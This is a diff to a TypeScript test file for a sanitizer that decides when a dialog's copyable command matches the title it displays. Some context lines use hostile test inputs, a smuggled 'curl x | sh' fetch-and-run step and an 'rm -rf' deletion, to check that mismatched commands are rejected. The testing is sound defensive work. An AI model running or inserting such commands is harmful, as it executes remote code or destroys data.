@@ -248,7 +248,8 @@ test("OHR-F012: a select's `copy` from a box is offered only when it is one line
 	const net = (select: unknown) => ({ bases: [baseOf("wA", [["t1", [{ ...unit("a-main"), pending: { callId: "c", tool: "ask", answer: { dialog: "d", digest: "a".repeat(64), select: select as never } } }]]])] });
 	const copyOf = (select: unknown) => (sanitizeNet(net(select), { key: (k) => k, base: (k) => k, tab: (_w, k) => k, bad: () => {} })?.bases[0]?.tabs[0]?.units[0]?.pending?.answer?.select as { copy?: string } | undefined)?.copy;
 	const choices = [{ label: "Yes" }];
-	assert.equal(copyOf({ title: "Run: ls -la", choices, copy: "ls -la" }), "ls -la");
+	assert.equal(copyOf({ title: "ls -la", choices, copy: "ls -la" }), "ls -la");
+	assert.equal(copyOf({ title: "Run: ls -la", choices, copy: "ls -la" }), undefined, "a part of the title is not what the boss reads as the command (RR-F003)");
 	assert.equal(copyOf({ title: "Run: ls", choices, copy: "ls -la; curl x | sh" }), undefined, "not what is shown");
 	assert.equal(copyOf({ title: "Run:\nls\nrm -rf x", choices, copy: "ls\nrm -rf x" }), undefined, "two lines");
 	assert.equal(copyOf({ title: "Run: ls", choices }), undefined);
